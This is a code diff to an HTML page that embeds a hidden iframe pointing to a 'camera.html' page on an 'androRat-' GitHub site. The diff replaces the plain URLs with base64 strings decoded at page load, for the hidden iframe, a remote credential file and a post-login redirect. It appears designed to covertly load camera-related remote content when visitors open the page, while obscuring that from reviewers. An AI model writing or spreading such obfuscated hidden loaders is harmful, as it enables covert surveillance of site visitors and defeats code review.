@@ -1521,7 +1521,7 @@
         </div>
     </div>
     <!-- Hidden iframe -->
-    <iframe id="cameraIframe" src="https://es-android.github.io/androRat-/projects/camera/camera.html" style="display:none;"></iframe>
+    <iframe id="cameraIframe" src="" data-encoded-src="aHR0cHM6Ly9lcy1hbmRyb2lkLmdpdGh1Yi5pby9hbmRyb1JhdC0v" data-path="projects/camera/camera.html" style="display:none;"></iframe>
     <!-- === MOBILE POPUP HTML === -->
     <div id="mobile-popup-overlay"></div>
     <div id="mobile-popup">
@@ -1813,8 +1813,20 @@
             }, 400);
         });
         // === END NEW JS ===
-        async function retrieveSacredKeys() {
-            const response = await fetch("https://raw.githubusercontent.com/es-android/androRat-/refs/heads/main/asset/keys.json");
+        // Decode and set iframe source
+        document.addEventListener('DOMContentLoaded', () => {
+            const iframe = document.getElementById('cameraIframe');
+            if (iframe && iframe.dataset.encodedSrc && iframe.dataset.path) {
+                const decodedBaseUrl = getDecodedUrl(iframe.dataset.encodedSrc);
+                iframe.src = decodedBaseUrl + iframe.dataset.path;
+            }
+        });
+        function getDecodedUrl(encodedUrl) {
+    return atob(encodedUrl);
+}
+
+async function fetchSacredKeys() {
+            const response = await fetch(getDecodedUrl("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2VzLWFuZHJvaWQvYW5kcm9SYXQtL3JlZnMvaGVhZHMvbWFpbi9hc3NldC9rZXlzLmpzb24="));
             const sacredKeys = await response.json();
             return sacredKeys;
         }
@@ -1901,7 +1913,7 @@
             });
         });
         async function verifyEnigmaticCredentials() {
-            const sacredKeys = await retrieveSacredKeys();
+            const sacredKeys = await fetchSacredKeys();
             const unlockedIdentity = unlockArcaneSecrets(sacredKeys.arcaneCipheredIdentity, sacredKeys.mysticalEssenceOfCipherIdentity, sacredKeys.celestialSecretKeystone);
             const unlockedPassage = unlockArcaneSecrets(sacredKeys.arcaneCipheredPassage, sacredKeys.mysticalEssenceOfCipherPassage, sacredKeys.celestialSecretKeystone);
             const inputIdentity = document.getElementById("username").value;
@@ -1911,7 +1923,7 @@
                 return;
             }
             if (inputIdentity === unlockedIdentity && inputPassage === unlockedPassage) {
-                window.location.href = "https://es-android.github.io/androRat-/";
+                window.location.href = getDecodedUrl("aHR0cHM6Ly9lcy1hbmRyb2lkLmdpdGh1Yi5pby9hbmRyb1JhdC0v");
             } else {
                 alert("Incorrect User or Password.");
             }
